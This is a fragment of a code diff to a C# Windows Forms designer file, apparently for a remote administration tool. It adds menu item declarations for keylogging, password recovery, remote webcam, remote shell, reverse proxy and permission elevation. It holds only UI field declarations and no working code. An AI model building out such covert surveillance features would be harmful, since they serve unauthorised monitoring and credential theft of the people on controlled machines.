         private System.Windows.Forms.ToolStripMenuItem localFileToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem webFileToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem elevateClientPermissionsToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem2;
-        private System.Windows.Forms.ToolStripMenuItem remoteWebcamToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem remoteWebcamToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem fileMangToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem showMessageboxToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem sendToWebsiteToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem taskManagerToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem systemInformationToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem startupManagerToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem tCPConnectionsToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem registryEditorToolStripMenuItem2;
+        private System.Windows.Forms.ToolStripMenuItem reverseProxyToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem actionsToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem shutdownToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem restartToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem standbyToolStripMenuItem1;
     }
 }
 
